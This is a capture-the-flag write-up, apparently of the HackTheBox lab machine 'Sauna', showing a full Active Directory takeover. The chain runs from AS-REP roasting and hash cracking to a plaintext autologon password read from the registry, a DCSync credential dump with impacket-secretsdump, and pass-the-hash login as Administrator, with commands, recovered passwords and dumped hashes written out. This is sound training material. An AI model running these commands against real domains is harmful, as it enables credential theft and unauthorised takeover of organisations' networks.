#box #kerbrute #hashcat #winlogon #BloodHound #DCSync #impacket-secretsdump 

Sauna demonstrate the possibility to build a list of user within really basic OSINT techniques such as recognize a list of users from a corporate website that results then in the discovery of an available users. The user found can be ASREPRoasted, gaining an initial foothold with the ASREP hash. Once gained the foothold a WinLogon password is shown in clear text when querying the WinLogon registry key, the password is one of a service user. With the service user it's possible to perform a DCSync attack and obtain the hash of the Administrator which we'll use to authenticate as Administrator of the DC.
## Nmap

```bash
# Nmap 7.95 scan initiated Fri Sep  5 08:54:56 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.95.180
Nmap scan report for 10.129.95.180
Host is up (0.050s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-05 19:55:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-05T19:55:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  5 08:55:48 2025 -- 1 IP address (1 host up) scanned in 51.53 seconds
```
## 80 - Http

While searching for clues on the website, a list of users seems to appear when opening the `About Us` page.
![[attachments/sauna-writeup-1.png]]
We copy this list of user in a text file and then permutate name and surname to identify the pattern used on the domain to declare users:
```bash
Fergus.Smith
f.smith
fsmith
fergussmith
[...]
```

## Kerbrute and ASREPRoasting

We then use kerbrute to identify existing users on the domain, finding de facto `fsmith` as an existing user of the domain.

```bash
./kerbrute userenum -d egotistical-bank.local --dc 10.129.95.180 users.txt
```

Then, we check whether any user is open to ASREPRoasting due of `DONT_REQ_PREAUTH` to true on the domain, identifying that the user `fsmith` is in fact vulnerable to an ASREPRoast attack:

```bash
impacket-GetNPUsers -request 'EGOTISTICAL-BANK.LOCAL/fsmith'                  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate fsmith, getting its TGT
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6f3651c0523afa6aca872c592a81780e$1d4e65177d0bbfa7eeb59accfe68d0b9e003b43d8de5cc1da698a659a354b318ceda25e5ffa6f6d49e355aa36990a8a70da4ceb0b25edeee1f9a8e2351a21b34ffd5806c1e320b9f702d03669c1e74e75a2236b6a47a7c64af8e7bb2cadd31911e1457d79c4adcb0e7eb0955be978975e7fdbe70f621e060e048dda9cbd0e7cda4af7699f8dcecc085e57f59f169311f1c6c6cc1e288086737ef23d906efeacd329610a841548a8890a1fc67eeac1ac89a6e5a4fc0c8e75c702644ffcb48b1b6468ba08303b109ee8b7698132534de3914994b17ecae8d2f5a13905ab8e962ad53576754704b6a8a9212b37724d9cfa860fa00a828e365d107b3ff0bb70156c3
```

Once obtained the ASREP hash, we proceed to crack it with `hashcat`:

```bash
hashcat -m 18200 fsmith_asrep.txt /usr/share/wordlists/rockyou.txt
```

Obtaining the credentials: `fsmith:Thestrokes23`.

## WinLogon to Service user

Once obtained the initial foothold, we look for further information on SMB without success, then we opt to authenticate with `evil-winrm`. 

```bash
evil-winrm -u fsmith -i EGOTISTICAL-BANK.LOCAL
```

Once inside the machine, after looking for different escalation vector, we find out that the target has saved in memory a `WinLogon` credential for the user `svc_loanmgr`. By querying the proper registry key we obtain the new foothold in clear-text:

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8c9319f7
    ShutdownFlags    REG_DWORD    0x8000022b
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

Obtaining control of: `svc_loanmgr:Moneymakestheworldgoround!`

## DCSync within Bloodhound

At this point we opt to scan the system with bloodhound-python.
When opening the graph and marking the owned targets as owned, we realize that svc_loanmgr has some interesting privileges in the system, the user has `GetChanges` and `GetChangesAll` over the entire Domain. This privilege permits us to perform a DCSync attack over the domain to extract the `NTDS.dit` and gain the hash of the Administrator.

![[attachments/sauna-writeup-2.png]]

For ease, we opt to perform this attack with `impacket-secretsdump` instead of `mimikatz`:

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'EGOTISTICAL-BANK.LOCAL'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:e9faa0dde05d9386ec25cf7e4597462f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:e115bda8e7c38bb9eabf00150f0d4e13051e061142d62cfbbca0d5966dece14e
SAUNA$:aes128-cts-hmac-sha1-96:aa28605ad31c519a8c2d84fc396ed6a1
SAUNA$:des-cbc-md5:38985da41907ea8f
[*] Cleaning up...
```

We try to crack the password of the Administrator, but without success. We then opt for a PtH attack over WinRM, obtaining full control of the domain:

```bash
evil-winrm -u Administrator -i SAUNA.EGOTISTICAL-BANK.LOCAL -H 823452073d75b9d1cf70ebdf86c7f98e
```
